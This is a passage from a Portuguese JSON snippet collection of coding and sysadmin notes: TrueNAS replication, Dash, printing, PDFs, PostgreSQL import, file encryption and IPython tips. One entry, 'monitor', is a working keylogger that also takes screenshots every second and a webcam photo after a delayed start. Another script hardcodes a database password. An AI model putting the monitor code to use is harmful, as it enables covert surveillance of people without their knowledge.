voc\u00ea baixou \n\tdo servidor original.\n\t- Reinicie o servidor TrueNas para aplicar a configura\u00e7\u00e3o.\n\n\n3) REPLICAR OS DADOS (DATASETS)\nPara copiar os dados, voc\u00ea pode usar a replica\u00e7\u00e3o de ZFS entre os dois servidores. Aqui est\u00e3o os passos para configurar a replica\u00e7\u00e3o:\n\n3.1) Configurar Replica\u00e7\u00e3o ZFS no Servidor Original:\n\t- V\u00e1  para Tasks > Replication Tasks.\n\t- Clique em Add para adicionar uma nova tarefa de replica\u00e7\u00e3o.\n\n3.2) Configurar a Tarefa de Replica\u00e7\u00e3o:\n\t- Source Dataset: Selecione o dataset que voc\u00ea deseja replicar.\n\t- Desination:\n\t* Remote ZFS Pool/Dataset: Configure para o servidor destino.\n\t* Remote Host: Insira o endere\u00e7o IP ou hostname do novo servidor TrueNAS.\n\t* Remote User: Utilize um usu\u00e1rio com permiss\u00f5es apropriadas(normalmente \t\t'root')\n\n3.3) Iniciar Replica\u00e7\u00e3o:\n\t- Ap\u00f3s configurar a tarefa de replica\u00e7\u00e3o, inicie a replica\u00e7\u00e3o para copiar os dados do servidor original para o novo servidor.\n\n4) VERIFICA\u00c7\u00c3O E AJUSTES FINAIS\n\n4.1) Verificar Dados e Permiss\u00f5es:\n\t- Ap\u00f3s a replica\u00e7\u00e3o, verifique se os dados e permiss\u00f5es foram replicadas \t\t\tcorretamente.\n\t- Acesse os datasets no novo servidor TrueNas e verifique se os usu\u00e1rios e \t\t\tgrupos possuem permiss\u00f5es apropriadas.\n4.2) Ajustes Necess\u00e1rios:\n\t- Se houver alguma discrep\u00e2ncia nas permiss\u00f5es ou dados, ajuste manualmente \tconforme necess\u00e1rio.\n\n5. CONFIGURAR COMPARTILHAMENTOS DE REDE\n\tSe voc\u00ea tiver compartilhamentos de redes configurados (SMB, NFS, etc.) voc\u00ea precisar\u00e1 recri\u00e1-los no novo servidor TrueNas.\nSiga os mesmos passos usados no servidor original para configurar os compartilhamentos.\n\tAo seguir esses passos, voc\u00ea deve ser capaz de replicar a configura\u00e7\u00e3o completa do seu servidor TrueNas original para um novo servidor TrueNas, incluindo datasets, usu\u00e1rios grupos e permiss\u00f5es.\n\n", "categoria": "servidor NAS - TRUENAS"}, "Dashboard html": {"codigo": "import dash\nfrom dash import dcc, html\nfrom dash.dependencies import Input, Output\nimport plotly.express as px\nimport pandas as pd\n\n# Criar alguns dados de exemplo\ndf = pd.DataFrame({\n    \"Category\": [\"A\", \"B\", \"C\", \"D\"],\n    \"Value\": [4, 1, 2, 7]\n})\n\n# Inicializar o aplicativo Dash\napp = dash.Dash(__name__)\n\n# Layout do aplicativo\napp.layout = html.Div([\n    html.H1(\"Meu Dashboard Interativo\"),\n    dcc.Dropdown(\n        id='dropdown',\n        options=[{'label': i, 'value': i} for i in df['Category']],\n        value='A'\n    ),\n    dcc.Graph(id='graph')\n])\n\n# Callback para atualizar o gr\u00e1fico com base na sele\u00e7\u00e3o do dropdown\n@app.callback(\n    Output('graph', 'figure'),\n    [Input('dropdown', 'value')]\n)\ndef update_graph(selected_category):\n    filtered_df = df[df['Category'] == selected_category]\n    fig = px.bar(filtered_df, x='Category', y='Value')\n    return fig\n\n# Executar o servidor\nif __name__ == '__main__':\n    app.run_server(debug=True)\n\n", "categoria": "Dashboards"}, "fazendo impressao com python - sem edicao": {"codigo": "import win32print\nimport win32ui\nfrom PIL import Image, ImageWin\n\n# Defina o nome da impressora\nprinter_name = win32print.GetDefaultPrinter()\n\n# String que voc\u00ea deseja imprimir\nstring_to_print = \"Ol\u00e1, mundo!\"\n\n# Abre a impressora\nhprinter = win32print.OpenPrinter(printer_name)\ntry:\n    # Inicia um trabalho de impress\u00e3o\n    hjob = win32print.StartDocPrinter(hprinter, 1, (\"String Printing Job\", None, \"RAW\"))\n    try:\n        # Inicia uma p\u00e1gina\n        win32print.StartPagePrinter(hprinter)\n        \n        # Cria um contexto de dispositivo para a impressora\n        hdc = win32ui.CreateDC()\n        hdc.CreatePrinterDC(printer_name)\n        \n        # Define a orienta\u00e7\u00e3o da p\u00e1gina e o tamanho do papel (A4)\n        hdc.SetMapMode(win32con.MM_TWIPS)  # 1/1440 inches\n        hdc.StartDoc(\"String Printing Job\")\n        hdc.StartPage()\n        \n        # Configura a posi\u00e7\u00e3o do texto\n        hdc.TextOut(0, 0, string_to_print)\n        \n        # Finaliza a p\u00e1gina\n        hdc.EndPage()\n        hdc.EndDoc()\n        \n        # Finaliza a p\u00e1gina (para win32print)\n        win32print.EndPagePrinter(hprinter)\n    finally:\n        # Finaliza o trabalho de impress\u00e3o\n        win32print.EndDocPrinter(hprinter)\nfinally:\n    # Fecha a impressora\n    win32print.ClosePrinter(hprinter)\n", "categoria": "impressao - impressora"}, "fazendo strings em pdf": {"codigo": "from reportlab.lib.pagesizes import letter\nfrom reportlab.pdfgen import canvas\n\n# Defina as informa\u00e7\u00f5es\nnome = 'Samuel Souza'\nendereco = 'Avenida Deputado'\n\n# Cria um arquivo PDF\nfile_name = 'informacoes.pdf'\nc = canvas.Canvas(file_name, pagesize=letter)\nwidth, height = letter\n\n# Adiciona o t\u00edtulo\nc.setFont(\"Helvetica-Bold\", 16)\nc.drawString(100, height - 40, \"Informa\u00e7\u00f5es Pessoais\")\n\n# Adiciona o nome\nc.setFont(\"Helvetica\", 12)\nc.drawString(100, height - 80, f\"Nome: {nome}\")\n\n# Adiciona o endere\u00e7o\nc.drawString(100, height - 100, f\"Endere\u00e7o: {endereco}\")\n\n# Finaliza o PDF\nc.save()\n\nprint(f\"Arquivo PDF '{file_name}' criado com sucesso.\")\n", "categoria": "impressao - impressora"}, "strings em pdf e fazendo comando de impress\u00e3o": {"codigo": "from reportlab.lib.pagesizes import letter\nfrom reportlab.pdfgen import canvas\nimport win32print\nimport win32api\nimport os\n\n# Defina as informa\u00e7\u00f5es\nnome = 'Samuel Souza'\nendereco = 'Avenida Deputado'\n\n# Cria um arquivo PDF\nfile_name = 'informacoes.pdf'\nc = canvas.Canvas(file_name, pagesize=letter)\nwidth, height = letter\n\n# Adiciona o t\u00edtulo\nc.setFont(\"Helvetica-Bold\", 16)\nc.drawString(100, height - 40, \"Informa\u00e7\u00f5es Pessoais\")\n\n# Adiciona o nome\nc.setFont(\"Helvetica\", 12)\nc.drawString(100, height - 80, f\"Nome: {nome}\")\n\n# Adiciona o endere\u00e7o\nc.drawString(100, height - 100, f\"Endere\u00e7o: {endereco}\")\n\n# Finaliza o PDF\nc.save()\n\n# Fun\u00e7\u00e3o para imprimir o arquivo PDF\ndef print_pdf(file_name):\n    # Obt\u00e9m a impressora padr\u00e3o\n    printer_name = win32print.GetDefaultPrinter()\n    \n    # Usa o win32api para chamar o comando de impress\u00e3o\n    win32api.ShellExecute(\n        0,\n        \"print\",\n        file_name,\n        f'/d:\"{printer_name}\"',\n        \".\",\n        0\n    )\n\n# Imprime o arquivo PDF\nprint_pdf(file_name)\n\nprint(f\"Arquivo PDF '{file_name}' criado e enviado para a impressora com sucesso.\")\n", "categoria": "impressao - impressora"}, "transferir json para sql": {"codigo": "import json, sys, psycopg2\n\ndef carregar_dicionario_json(arq, dic):\n\tarquivo = arq\n\tdicionario = dic\n\ttry:\n\t\twith open(arquivo, 'r') as file:\n\t\t\tcontent = file.read()\n\t\t\tif content:\n\t\t\t\tdicionario.update(json.loads(content))\n\t\t\tprint('Estoque carregado em dicion\u00e1rio com sucessor!!!')\n\texcept FileNotFoundError:\n\t\tpass\n\t\t\n\n\n\t\n\t\ndef converter_lista_db():\n\tprint('Conectando com o servidor.')\n\tconn = psycopg2.connect(\n\tdbname = 'analysis',\n\tuser = 'postgres',\n\tpassword = '520250890',\n\thost = 'localhost',\n\tport = '5432')\n\tcursor = conn.cursor()\n\tprint('Servidor conectado com sucesso!!!')\n\t\n\t\n\ta = 0\n\t#print(estoque)\n\tfor chave, v in estoque.items():\n\n\t\tproduto = str(chave)\n\t\tcodigo = str(v['codigo'])\n\t\tpreco = float(v['valor'])\n\t\tcusto = float(v['custo'])\n\t\tquantidade = float(v['quantidade'])\n\t\tfornecedor = str(v['fornecedor'])\n\t\tcategoria = str(v['categoria'])\n\t\tsubcategoria = str(v['subcategoria'])\n\t\tmarca = str(v['marca'])\n\t\tlocalizacao = str(v['localizacao'])\n\t\t\n\t\tcursor = conn.cursor()\n\t\tcursor.execute('''\n\t\t\tINSERT INTO estoque(codigo, produto, preco, custo, quantidade, categoria,\n\t\t\t\tsubcategoria, marca, fornecedor)\n\t\t\tVALUES(%s,%s,%s,%s,%s,%s,%s,%s,%s)''',\n\t\t\t(codigo, produto, preco, custo, quantidade, categoria, subcategoria,\n\t\t\tmarca, fornecedor))\n\t\t\n\t\t\n\t\tconn.commit()\n\t\ta += 1\n\t\tprint(f'{produto} inserido com sucesso!!!')\n\tprint(f'{a} produtos inserido no banco de dados')\n\n\nestoque = {}\ncarregar_dicionario_json('estoque.json', estoque)\nconverter_lista_db()\n", "categoria": "Programas exemplos"}, "habilitando descober convidado - ver pastas sem credenciais, apenas ver.": {"codigo": "Shares > windows(SMB) Shares, escolha um dos SMBs > edit(lapis) > advanced options > [x] allow gest acess.", "categoria": "servidor NAS - TRUENAS"}, "start automatically - smb e outros autom\u00e1tico": {"codigo": "Sistem Settings > Services > .......", "categoria": "servidor NAS - TRUENAS"}, "print - tira print da inteface a armazena em uma pasta": {"codigo": "import pyautogui\nfrom datetime import datetime\nimport os\n\n# Define o caminho da pasta onde as capturas de tela ser\u00e3o armazenadas\npasta_destino = 'capturas_de_tela'\nif not os.path.exists(pasta_destino):\n\tos.makedirs(pasta_destino)\n\n# Captura a tela\nscreenshot = pyautogui.screenshot()\n\n# Define o nome do arquivo com a data e hora atual\ntimestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')\ncaminho_arquivo = os.path.join(pasta_destino, f'screenshot_{timestamp}.png')\n\n# Salva a captura de tela na pasta especificada\nscreenshot.save(caminho_arquivo)\n\nprint(f'Captura de tela salva em {caminho_arquivo}')", "categoria": "Python Geral"}, "tirar foto com python e armazenar": {"categoria": "Python Geral", "codigo": "import cv2 #pip install opencv-python\n\ndef tirar_foto():\n\t# Inicializa a captura de v\u00eddeo (0 indica a primeira webcam encontrada)\n\tcap = cv2.VideoCapture(0)\n\n\t# Verifica se a webcam foi aberta com sucesso\n\tif not cap.isOpened():\n\t\tprint(\"Erro: N\u00e3o foi poss\u00edvel abrir a webcam.\")\n\t\treturn\n\n\t# L\u00ea um frame da webcam\n\tret, frame = cap.read()\n\n\t# Verifica se a captura do frame foi bem-sucedida\n\tif not ret:\n\t\tprint(\"Erro: N\u00e3o foi poss\u00edvel capturar a imagem.\")\n\t\tcap.release()\n\t\treturn\n\n\t# Caminho do arquivo onde a imagem ser\u00e1 salva\n\tcaminho_arquivo = 'foto_webcam.png'\n\n\t# Salva a imagem capturada\n\tcv2.imwrite(caminho_arquivo, frame)\n\n\t# Libera a captura de v\u00eddeo\n\tcap.release()\n\n\tprint(f\"Foto capturada e salva como {caminho_arquivo}\")\n\n# Chama a fun\u00e7\u00e3o para tirar a foto\ntirar_foto()\n"}, "monitor": {"codigo": "from pynput import keyboard\nfrom datetime import datetime\nimport pyautogui\nimport cv2 #pip install opencv-python\nimport threading\nimport time\nimport os\n\nconteudo = [] #Teclad pressionadas ser\u00e1 salvas aqui separadamente ['p', 'a', 'r',...]\nsegundos = 30 #Segundos para iniciar o programa\ncont = ''.join(conteudo) #Junta todo o conte\u00fado da lista que est\u00e3o separados\narquivo_teclado = datetime.now().strftime('%d-%m-%y-%H-%M-%S')+'.txt' #Nome arquivo\na = False #Para interromper o loop de Worker\n\n\ndef on_press(key):\n\tglobal stra, cont\n\ttry:\n\t\tteclado = key.char\n\t\tconteudo.append(teclado)\n\texcept:\n\t\t\tconteudo.append(' ')\n\tcont = ''.join(conteudo)\n\n\n\ndef on_release(key):\n\tglobal a\n\tif key == keyboard.Key.tab:\n\t\ta = True\n\t\tprint('parou')\n\t\treturn False\n\t\ndef gravar_imagem():\n\tpasta_destino = 'cpt' #Captura de telas\n\tif not os.path.exists(pasta_destino):\n\t\tos.makedirs(pasta_destino)\n\t\t\n\tscreenshot = pyautogui.screenshot()\n\ttimestamp = datetime.now().strftime('%d-%m-%y-%H-%M-%S')\n\t#Junta o arquivo dentro da pasta que acabamos de criar ou j\u00e1 existente\n\tcaminho_arquivo = os.path.join(pasta_destino, f'screenshot_{timestamp}.png')\n\tscreenshot.save(caminho_arquivo)\n\t\n\t\ndef gravar_teclado():\n\tglobal cont, arquivo_teclado\n\tpasta_destino = 'tec'\n\tif not os.path.exists(pasta_destino):\n\t\tos.makedirs(pasta_destino)\n\t\n\twith open(f'{pasta_destino}/{arquivo_teclado}', 'w') as arquivo:\n\t\tarquivo.write(str(cont))\n\t\n\t\ndef tirar_foto():\n\t\t\n\t\tcap = cv2.VideoCapture(0)\n\t\tif not cap.isOpened():\n\t\t\tprint('eeor')\n\t\t\treturn\n\t\t\n\t\tret, frame = cap.read()\n\t\t\n\t\tif not ret:\n\t\t\tprint('rrr')\n\t\t\tcap.release()\n\t\t\treturn\n\t\t\t\n\t\tcaminho_arquivo = 'foto.png'\n\t\tcv2.imwrite(caminho_arquivo, frame)\n\t\tcap.release()\n\t\t\n\t\n\t\t\n\ndef work():\n\n\tglobal a, segundos, conteudo\n\ttime.sleep(segundos)\n\ttirar_foto()\n\twhile True:\n\t\tif a:\n\t\t\tbreak\n\t\tgravar_imagem()\n\t\tgravar_teclado()\n\n\t\ttime.sleep(1)\n\t\t\ndef listener_thread():\n\n\tlistener_keyboard = keyboard.Listener(on_press=on_press, on_release=on_release)\n\tlistener_keyboard.start()\n\tlistener_keyboard.join()\n\n#O Thread funciona paralelisando duas fun\u00e7\u00f5es diferentes, \n#temos que dar o start nas duas.\nteclado_thread = threading.Thread(target=listener_thread)\nwork_thread = threading.Thread(target=work)\nteclado_thread.start()\nwork_thread.start()\n\t\n\n", "categoria": "Programas exemplos"}, "criptografando/decriptografando arquivo em python": {"codigo": "CRIPTOGRAFANDO##################################################\n# pip install cryptography\n\nfrom cryptography.fernet import Fernet \nimport base64\nimport hashlib\nimport os\n\n#Geramos a hash atrav\u00e9s da senha\n# - > significa o tipo que a fun\u00e7\u00e3o retorna\ndef gerar_chave_com_senha(senha:str) -> bytes:\n\tsenha_bytes = senha.encode('utf-8')\n\tchave = hashlib.sha256(senha_bytes).digest()\n\treturn base64.urlsafe_b64encode(chave[:32])\n\n#Vamos preciar do nome do arquivo e da senha em str\ndef criptografar_arquivo(nome_arquivo:str, senha:str) -> None:\n\t#Criptografa um arquivo.\n\tchave = gerar_chave_com_senha(senha)\n\tfernet = Fernet(chave)\n\t#'rb' l\u00ea os bits do arquivo\n\twith open(nome_arquivo, 'rb') as arquivo:\n\t\tdados = arquivo.read()\n\t\t\n\tdados_criptografados = fernet.encrypt(dados)\n\twith open(nome_arquivo, 'wb') as arquivo_criptografado:\n\t\tarquivo_criptografado.write(dados_criptografados)\n\t\t\n\tprint('dados criptografados')\n\t\ncriptografar_arquivo('data/carro1.jpg', 'peixinho123')\n\n\nDECRIPTOGRAFANDO##################################################\nfrom cryptography.fernet import Fernet\nimport base64\nimport hashlib\nimport os\n\ndef gerar_chave_com_senha(senha:str) -> bytes:\n\tsenha_bytes = senha.encode('utf-8')\n\tchave = hashlib.sha256(senha_bytes).digest()\n\treturn base64.urlsafe_b64encode(chave[:32])\n\n\ndef descriptografar_arquivo(nome_arquivo:str, senha:str) -> None:\n\tchave = gerar_chave_com_senha(senha)\n\tfernet = Fernet(chave)\n\t\n\twith open(nome_arquivo, 'rb') as arquivo_criptografado:\n\t\tdados_criptografados = arquivo_criptografado.read()\n\t\t\n\tdados = fernet.decrypt(dados_criptografados)\n\t\n\twith open(nome_arquivo, 'wb') as file:\n\t\tfile.write(dados)\n\t\ndescriptografar_arquivo('data/carro1.jpg', 'peixinho123')\n", "categoria": "criptografia"}, "QFrame - linha para dividir coisas no layout": {"codigo": "from PyQt6.QtWidgets import (QApplication, QWidget, QFrame)\nimport sys\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(300, 400)\n\t\tself.setWindowTitle('QFrame')\n\t\tself.setUpMainWindow()\n\t\tself.showMaximized()\n\t\t\n\tdef setUpMainWindow(self):\n\t\tframe = QFrame(self)\n\t\tframe.move(20, 20)\n\t\t#frame.setFixedSize(1000, 20)\n\t\tframe.setFrameShape(QFrame.Shape.HLine)#Linha horizontal\n\t\t#frame.setFrameShape(QFrame.Shape.VLine)#Linha vertical\n\t\t#frame.setFrameShape(QFrame.Shape.NoFrame)#Sem borda\n\t\t#frame.setFrameShape(QFrame.Shape.Box)#Caixa planta + todos lados\n\t\t#frame.setFrameShape(QFrame.Shape.WinPanel)#Caixa elevada\n\t\t#frame.setFrameShape(QFrame.Shape.StyledPanel)\n\t\tframe.setFrameShadow(QFrame.Shadow.Sunken)#Borda simles\n\t\t#frame.setFrameShadow(QFrame.Shadow.Raised)#Borda elevada\n\t\t#frame.setFrameShadow(QFrame.Shadow.Sunken)#Borda rebaixada\n\t\t\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n", "categoria": "PyQt6"}, "intalando o Anaconda - software voltado para ciencia de dados": {"categoria": "python ciencia de dados handbook", "codigo": "https://www.anaconda.com/download\n\nvai ter 1 gb para baixar\n\n\n\n\nDurante a instala\u00e7\u00e3o do Anaconda, voc\u00ea encontrar\u00e1 a se\u00e7\u00e3o \"Advanced Installation Options\". Aqui est\u00e3o as op\u00e7\u00f5es que voc\u00ea ver\u00e1 e recomenda\u00e7\u00f5es sobre quais marcar:\n \nAdd Anaconda3 to my PATH environment variable:\n \n1. Descri\u00e7\u00e3o: Esta op\u00e7\u00e3o adiciona o diret\u00f3rio Anaconda ao PATH do sistema, permitindo que voc\u00ea execute comandos do Anaconda no terminal sem especificar o caminho completo.\n2. Recomenda\u00e7\u00e3o: Desmarcar. \u00c9 geralmente recomendado n\u00e3o marcar esta op\u00e7\u00e3o para evitar conflitos com outras vers\u00f5es do Python que possam estar instaladas no seu sistema. Em vez disso, voc\u00ea pode usar o Anaconda Prompt ou configurar manualmente o PATH se necess\u00e1rio.\n \nRegister Anaconda3 as my default Python 3.x:\n \n1. Descri\u00e7\u00e3o: Esta op\u00e7\u00e3o registra o Python do Anaconda como a vers\u00e3o padr\u00e3o de Python no seu sistema.\n2. Recomenda\u00e7\u00e3o: Marcar se voc\u00ea deseja que o Python do Anaconda seja a vers\u00e3o padr\u00e3o no seu sistema. Isso pode ser \u00fatil se voc\u00ea planeja usar o Anaconda principalmente e n\u00e3o tem outras vers\u00f5es espec\u00edficas de Python em uso.\nOutras Considera\u00e7\u00f5es\n\u00b7 Instalar no Diret\u00f3rio Padr\u00e3o: Geralmente \u00e9 melhor instalar no diret\u00f3rio padr\u00e3o sugerido pelo instalador, a menos que voc\u00ea tenha uma raz\u00e3o espec\u00edfica para escolher um local diferente.\nPassos Detalhados\n \nBaixe o Instalador: Baixe a vers\u00e3o mais recente do instalador do Anaconda para o seu sistema operacional a partir do site oficial do Anaconda.\n \n \nExecute o Instalador: D\u00ea um duplo clique no instalador para iniciar o processo de instala\u00e7\u00e3o.\n \n \nAceite o Acordo de Licen\u00e7a: Leia e aceite os termos do acordo de licen\u00e7a.\n \n \nSelecione o Tipo de Instala\u00e7\u00e3o: Escolha \"Just Me\" (recomendado para a maioria dos usu\u00e1rios) ou \"All Users\" (requer permiss\u00f5es de administrador).\n \n \nEscolha o Diret\u00f3rio de Instala\u00e7\u00e3o: Use o diret\u00f3rio padr\u00e3o sugerido ou selecione um local diferente.\n \n \nAdvanced Installation Options:\n \no Add Anaconda3 to my PATH environment variable: Desmarque esta op\u00e7\u00e3o para evitar poss\u00edveis conflitos com outras instala\u00e7\u00f5es do Python.\no Register Anaconda3 as my default Python 3.x: Marque esta op\u00e7\u00e3o se voc\u00ea deseja que o Python do Anaconda seja a vers\u00e3o padr\u00e3o no seu sistema.\n \nConcluir a Instala\u00e7\u00e3o: Continue com a instala\u00e7\u00e3o e conclua o processo.\n \nAp\u00f3s a instala\u00e7\u00e3o, voc\u00ea pode usar o Anaconda Navigator ou o Anaconda Prompt para gerenciar ambientes e pacotes, e iniciar ferramentas como Jupyter Notebook, Spyder, e outros.\nSe voc\u00ea tiver alguma d\u00favida ou precisar de mais detalhes sobre uma etapa espec\u00edfica, sinta-se \u00e0 vontade para perguntar!\n "}, "lancando o IPython Shell": {"codigo": "abra o Acaconda Prompt e dicige IPython", "categoria": "python ciencia de dados handbook"}, "ajuda na documentacao - IPython": {"codigo": "In [3]: L = [1, 2, 3] \nIn [4]: L.insert? \nType: builtin_function_or_method \nString form: \nDocstring: L.insert(index, object) -- insert object before index\n\nIn[3] : L = [1, 2, 3]\nIn[4]: L.insert?\n\nIn[5]: L?\ninfo.....\n\nNo caso essa string no meio, vir\u00e1 para informar o que a fun\u00e7\u00e3o faz quando perguntada\nIn[6]: def square(a):\n'''Retorna o quadrado de a''' \n\treturn a ** 2\nIn[7]: square?\n\nIn [8]: square?? \nType: function \nString form: \nDefinition: square(a) \nSource: \ndef square(a): \n\t\"Return the square of a\" \n\treturn a ** 2\n\n\nIn [9]: len?? \nType: builtin_function_or_method \nString form: \nNamespace: Python builtin \nDocstring: len(object) -> integer\n\n\nEXPLORANDO COM O TAB#########################################\n#############################################################\nseleciona com o tab as poss\u00edveis fun\u00e7\u00f5es em rela\u00e7\u00e3o a esse objeto\nIn [10]: L.<TAB>\n L.append L.copy L.extend L.insert L.remove L.sort L.clear L.count L.index L.pop L.reverse\n\n\nIn [10]: L.c<TAB>\n L.clear L.copy L.count\n\nIn [10]: L.co<TAB>\n L.copy L.count\n\nIn [10]: L._<TAB>\n L.__add__ L.__gt__ L.__reduce__ L.__class__ L.__hash__ L.__reduce_ex__\n\n\nIn [10]: from itertools import co<TAB>\n combinations compress combinations_with_replacement count\n\nIn[10]: *Warning?\nmostra todos que terminam com Warning?\n\n\n\n\n", "categoria": "python ciencia de dados handbook"}, "Atalhos no IPythonShell": {"codigo": "Ctrl-a Move cursor to the beginning of the line \nCtrl-e Move cursor to the end of the line\n Ctrl-b (or the left arrow key) Move cursor back one character \nCtrl-f (or the right arrow key) Move cursor forward one character\nBackspace key Delete previous character in line \nCtrl-d Delete next character in line \nCtrl-k Cut text from cursor to end of line \nCtrl-u Cut text from beginning fo line to cursor \nCtrl-y Yank (i.e., paste) text that was previously cut \nCtrl-t Transpose (i.e., switch) previous two characters\nCtrl-p (or the up arrow key) Access previous command in history \nCtrl-n (or the down arrow key) Access next command in history \nCtrl-r Reverse-search through command history ( o que voc\u00ea digitar vai ser procurado no c\u00f3digo atual\nCtrl-l Clear terminal screen \nCtrl-c Interrupt current Python command \nCtrl-d Exit IPython session", "categoria": "python ciencia de dados handbook"}, "Comandos Magicos IPython": {"categoria": "python ciencia de dados handbook", "codigo": "Quando voc\u00ea vai copira um c\u00f3digo, voc\u00ea copia antes e quando colocar o %paste o \nc\u00f3digo aparece magicamente\n\ndef donothing(x):\n\treturn x\n\n%paste\ncola\nchama a fun\u00e7\u00e3o e funciona\n\n%cpaste\nvoce copia e digita o %cpaste, voce pode colar v\u00e1rias vezes, ele espera tu terminar de colar o que precisava.\n\n\n\nRODA CODIGOS EXTERNOS: %run#############################################\n#######################################################################\nmyscript.py\ndef square(x):\n\t'''square a number'''\n\treturn x ** 2\n\t\nfor N in range(1, 4):\nprint(N, 'squared is', square(N))\n\nIn[6]: %run myscript.py\n1 squared is 1 \n2 squared is 4 \n3 squared is 9\n\ncaso queira usar as fun\u00e7\u00f5es que est\u00e3o dentro do script, voc\u00ea pode usar, s\u00e3o importadas automaticamente.\n\nMEDINDO PERFORMANCE: %timeit %%timeit##################################\n####################################################################\n\nIn[8]:%timeit L = [n** for n in range(1000)]\n1000 loops, best of 3: 325 us per loop\n\nIn[9]: %%timeit\n...: L = []\n...: for n in range(1000):\n...: L.append(n**2)\n1000 loops, best of 3: 373 us per loop\n\nOBTENDO O C\u00d3DIGO HISTORICO: %history -n 1-4 ##############################\n#############################################################\nIn [12]: %history -n 1-4\n   1: import\n   2: import math\n   3: math.sin(2)\n   4: math.cos(2)\n\nAJUDA SOBRE FUN\u00c7\u00d5ES MAGICAS: ?, %magic e %Ismagic#########################\n#####################################################################\nas fun\u00e7\u00f5es magicas do IPython possuem docstrings.\n- Para ler a documenta\u00e7\u00e3o m\u00e1gica %timeit In[10]: %timeit?\n- Para obter uma lista r\u00e1pida e simples de todas as fun\u00e7\u00f5es m\u00e1gicas dispon\u00edveis = In[12]: %Ismagic\n\n\n\n\n\n\n\n"}, "comandos de diretorio em anaconda powershell": {"codigo": "In[1]: !ls\nmyproject.txt\n\nIn[2]: !pwd\n/home/jake/projects/myproject\n\nIn[3]: !echo 'printing from the shell'\nprinting from the shell\n\nIn[4]: contents = !ls\n\nIn[5]: print(contents)\n['myproject.txt']\n\nIn[6]: directory = !pwd\n\nIn[7]: print(directory)\n['users/jakevdp/notebooks/tmp/myproject']\n\nIn[8]: type(directory)\nIPython.utils.text.SList\n\nIn[9]: message = 'hello from python'\n\nIn[10]: !echo {message}\nhello from Python", "categoria": "python ciencia de dados handbook"}, "Erros and deputa\u00e7\u00e3o": {"codigo": "ALTERAR A QUANTIDADE DE INFORMA\u00c7\u00d5ES NO TRACERBACK\n\nIn[1]: def func1(a,b):\n\treturn a / b\n\n\tdef func2(x):\n\t\ta = x\n\t\tb = x\n\t\treturn func1(a, b)\n\nIn[2]: func2(1)  >>> vai dar error\n\nIn[3]: %xmode Plain ou Vebose\n\nmais detalhes ainda\nIn[7]: %debug\n\nipdb> print(a)\nipdb> print(b)\nipdb> up\nipdg down\nipdb> quit\n\n\npara deixar tudo autom\u00e1tico, erro j\u00e1 aparece com tracerback e o pdb para pesquisa de variavel\nIn[9]: %xmode Plain \n%pdb on \nfunc2(1)\n\n\nlist Show the current location in the fi\u0080le \nh(elp) Show a list of commands, or \u0080nd help on a speci\u0080c command \nq(uit) Quit the debugger and the program \nc(ontinue) Quit the debugger; continue in the program \nn(ext) Go to the next step of the program Repeat the previous command \np(rint) Print variables\n s(tep) Step into a subroutine \nr(eturn) Return out of a subroutine", "categoria": "python ciencia de dados handbook"}, "perfil e codigo de tempo - monitorar o tempo e identificar gargalos": {"categoria": "python ciencia de dados handbook", "codigo": "%time\nCronometre a execu\u00e7\u00e3o de uma \u00fanica instru\u00e7\u00e3o\n%timeit\nTempo de execu\u00e7\u00e3o repetida de uma \u00fanica instru\u00e7\u00e3o para maior precis\u00e3o\n%prun\nExecute o c\u00f3digo com o criador de perfil\n%lprun\nExecute o c\u00f3digo com o criador de perfil linha por linha\n%memit\nMe\u00e7a o uso de mem\u00f3ria de uma \u00fanica instru\u00e7\u00e3o\n%mprun\nExecute o c\u00f3digo com o criador de perfil de mem\u00f3ria linha por linha\n\n\n\nIn [16]: %timeit sum(range(1000))\n23.5 \u03bcs \u00b1 6.57 ns per loop (mean \u00b1 std. dev. of 7 runs, 10,000 loops each)\n\nIn [17]: %%timeit\n    ...: total = 0\n    ...: for i in range(1000):\n    ...:     for j in range(1000):\n    ...:         total += i * (-1) ** j\n    ...:\n207 ms \u00b1 86 \u03bcs per loop (mean \u00b1 std. dev. of 7 runs, 1 loop each)\n\nIn [18]: import random\n\nfazer dessa forma \u00e9 melhor para poder fazer opera\u00e7\u00f5es repetidas\nIn [19]: L = [random.random() for i in range(100000)]\n\nIn [20]: %timeit L.sort()\n837 \u03bcs \u00b1 35.5 \u03bcs per loop (mean \u00b1 std. dev. of 7 runs, 1,000 loops each)\n\nIn [22]: L = [random.random() for i in range(100000)]\n\n\nIn [24]: print('Sorting an unsorted list:')\nSorting an unsorted list:\n\nIn [25]: %time L.sort()\nCPU times: total: 15.6 ms\nWall time: 16 ms\n\n\n\n\n\nObserve como \u00e9 mais r\u00e1pido classificar a lista pr\u00e9-ordenada, mas observe tamb\u00e9m quanto tempo mais\no tempo leva %time versus %timeit, mesmo para a lista pr\u00e9-classificada! Isto \u00e9 um\nresultado do fato de que %timeit faz algumas coisas inteligentes nos bastidores para evitar sistemas\ntem chamadas de interferir com o tempo. Por exemplo, evita a limpeza de\nObjetos Python (conhecidos como coleta de lixo) que poderiam afetar o tempo.\nPor esse motivo, os resultados de %timeit geralmente s\u00e3o visivelmente mais r\u00e1pidos que os resultados de %time.\nPara %time como com %timeit, o uso da sintaxe cell-magic com sinal de porcentagem dupla permite\ntempo de scripts multilinhas:\n\n\nIn [26]: %%time\n    ...: total = 0\n    ...: for i in range(1000):\n    ...:     for j in range(1000):\n    ...:          total += i * (-1) ** j\n    ...:\nCPU times: total: 359 ms\nWall time: 348 ms\n\n\nCRIA\u00c7\u00c3O DE PERFIL DE SCRIPTS COMPLETOS##############################\n##############################################################\nEssa table representa o tempo na chamda e execu\u00e7\u00e3o de fun\u00e7\u00f5es, percebe-se que \no que est\u00e1 demorando mais \u00e9 (sum_of_lists), sendo assim podemos criar modos de \notimizar o c\u00f3digo.\n\n\nIn [1]: def sum_of_lists(n):\n   ...:     total = 0\n   ...:     for i in range(5):\n   ...:         L = [j ^ (j >> i) for j in range(n)]\n   ...:         total += sum(L)\n   ...:     return total\n   ...:\n\nIn [2]: %prun sum_of_lists(1000000)\n         82 function calls in 0.989 seconds\n\n   Ordered by: internal time\n\n   ncalls  tottime  percall  cumtime  percall filename:lineno(function)\n        1    0.705    0.705    0.866    0.866 <ipython-input-1-7df61cafdd50>:1(sum_of_lists)\n        5    0.161    0.032    0.161    0.032 